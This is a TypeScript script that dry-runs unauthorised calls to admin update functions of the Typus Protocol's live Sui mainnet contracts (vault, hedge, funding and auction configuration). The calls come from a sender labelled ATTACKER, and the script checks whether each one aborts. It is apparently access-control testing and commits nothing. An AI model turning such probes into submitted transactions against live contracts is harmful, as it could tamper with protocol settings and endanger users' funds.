import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const VERSION_PKG = "0xb44f547f5f9e35513a35139a8f2381923ea3f861e6d8debcd5aaf077f2d3a39d";
const TYPUS_HEDGE_PKG = "0x15f0d9c093179f38ec90b20ac336750f82921730c25fed63e951d37a1a542bf0";
const TYPUS_FUNDING_PKG = "0x7dab89563066afa000ee154738aac2cc8e7d3e26cd0b470183db63630ee9f965";
const TYPUS_AUCTION_PKG = "0x601a9f900ee01f6458809a881bef6115cc65762e2bd1fa022ea6bb6111862268";

// Version object from on-chain transactions
const VERSION_OBJ = "0x749d80ae01f8accf80100438bea507bba8294f41b9a0d958503341dda0433833";

// Hedge objects from transactions
const HEDGE_OBJ1 = "0x536284c92af3fc5fba496164b42925132b9b9e4ed14f63109d19adc337daa3df";
const HEDGE_OBJ2 = "0x085a8f24fe508bf060cce14f7b3b9a534c7528cd50d903a4717d6d07233bd9d5";

const ATTACKER = "0x0000000000000000000000000000000000000000000000000000000000001337";

async function testFn(label: string, pkg: string, module: string, fn: string, buildTx: (tx: Transaction) => void) {
  console.log(`\n=== ${label} ===`);
  try {
    const tx = new Transaction();
    buildTx(tx);
    const result = await client.devInspectTransactionBlock({
      sender: ATTACKER,
      transactionBlock: tx,
    });
    console.log(`Status: ${JSON.stringify(result.effects.status)}`);
    if (result.error) console.log(`Error: ${result.error.slice(0, 200)}`);
    if (result.events.length > 0) {
      console.log(`Events: ${result.events.map(e => e.type.split("::").pop()).join(", ")}`);
    }
  } catch(e: any) {
    const msg = e.message?.slice(0, 300) ?? String(e);
    // Extract abort code if present
    const abortMatch = msg.match(/MoveAbort.*?}, (\d+)\)/);
    const abortCode = abortMatch ? abortMatch[1] : "no abort code";
    console.log(`Threw (abort=${abortCode}): ${msg.slice(0, 200)}`);
  }
}

async function main() {
  console.log("=== Typus Protocol: update_* dry-run (non-authorized sender) ===\n");

  // First check Version object to see who's in authority
  console.log("--- Version object state ---");
  const versionObj = await client.getObject({ 
    id: VERSION_OBJ, 
    options: { showContent: true }
  });
  const vFields = (versionObj.data?.content as any)?.fields ?? {};
  console.log(`Version value: ${vFields.value}`);
  const authority = vFields.authority?.fields?.contents ?? vFields.authority ?? "?";
  console.log(`Authority: ${JSON.stringify(authority).slice(0, 300)}`);

  // Test 1: typus_hedge::update_vault_config
  await testFn("typus_hedge::update_vault_config", TYPUS_HEDGE_PKG, "typus_hedge", "update_vault_config",
    (tx) => {
      tx.moveCall({
        package: TYPUS_HEDGE_PKG,
        module: "typus_hedge",
        function: "update_vault_config",
        arguments: [
          tx.object(VERSION_OBJ),
          tx.object(HEDGE_OBJ1),
          tx.pure.u64(9999),    // param1
          tx.pure.string("hack"),  // param2 (string)
          tx.pure.u64(9999),    // param3
        ]
      });
    }
  );

  // Test 2: typus_hedge::update_hedge_ratio
  await testFn("typus_hedge::update_hedge_ratio", TYPUS_HEDGE_PKG, "typus_hedge", "update_hedge_ratio",
    (tx) => {
      tx.moveCall({
        package: TYPUS_HEDGE_PKG,
        module: "typus_hedge",
        function: "update_hedge_ratio",
        arguments: [
          tx.object(VERSION_OBJ),
          tx.object(HEDGE_OBJ1),
          tx.pure.u64(9999),
        ]
      });
    }
  );

  // Test 3: typus_hedge::set_reward_token
  await testFn("typus_hedge::set_reward_token", TYPUS_HEDGE_PKG, "typus_hedge", "set_reward_token",
    (tx) => {
      tx.moveCall({
        package: TYPUS_HEDGE_PKG,
        module: "typus_hedge",
        function: "set_reward_token",
        typeArguments: ["0x2::sui::SUI"],
        arguments: [
          tx.object(VERSION_OBJ),
          tx.object(HEDGE_OBJ1),
        ]
      });
    }
  );

  // Test 4: funding_vault::update_config
  await testFn("funding_vault::update_config", TYPUS_FUNDING_PKG, "funding_vault", "update_config",
    (tx) => {
      tx.moveCall({
        package: TYPUS_FUNDING_PKG,
        module: "funding_vault",
        function: "update_config",
        arguments: [
          tx.object(VERSION_OBJ),
          tx.object(HEDGE_OBJ2),  // try different vault
          tx.pure.u64(9999),
          tx.pure.u64(9999),
          tx.pure.u64(9999),
        ]
      });
    }
  );

  // Test 5: auction::update_auction_config
  await testFn("auction::update_auction_config", TYPUS_AUCTION_PKG, "auction", "update_auction_config",
    (tx) => {
      tx.moveCall({
        package: TYPUS_AUCTION_PKG,
        module: "auction",
        function: "update_auction_config",
        arguments: [
          tx.object(VERSION_OBJ),
          tx.object(HEDGE_OBJ1),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
          tx.pure.u64(0),
        ]
      });
    }
  );
}

main().catch(console.error);
